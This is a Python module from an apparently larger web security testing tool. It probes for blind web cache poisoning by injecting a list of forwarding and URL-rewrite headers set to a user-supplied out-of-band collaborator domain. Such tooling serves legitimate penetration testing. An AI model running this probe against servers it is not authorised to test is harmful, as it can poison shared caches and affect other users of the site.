from modules.base import AttackModule
from core.cache import extract_cache_headers
import core.config
from copy import deepcopy

BLIND_HEADERS = [
    'X-Forwarded-Host',
    'X-Forwarded-Scheme',
    'X-Original-URL',
    'X-Rewrite-URL',
    'X-Host',
    'X-Forwarded-Server',
    'X-Forwarded-Proto',
    'X-Forwarded-Port'
]

class BlindAttack(AttackModule):
    name = "Blind Cache Poisoning"

    def run(self, ctx):
        collab = None

        if core.config.collaborator is not None:
            collab = core.config.collaborator
        
        else:
            ctx.log.info("Enter Collaborator domain:")
            collab = input("> ").strip()

        if not collab:
            ctx.log.info("No collaborator provided, skipping.")
            return

        ctx.log.debug(f"Testing {self.name}")

        for h in BLIND_HEADERS:
            headers = deepcopy(ctx.headers)
            headers[h] = collab

            ctx.req.send(ctx.method, ctx.url, headers, ctx.body)

        ctx.log.info("Check your Collaborator for interactions (possible blind cache poisoning).")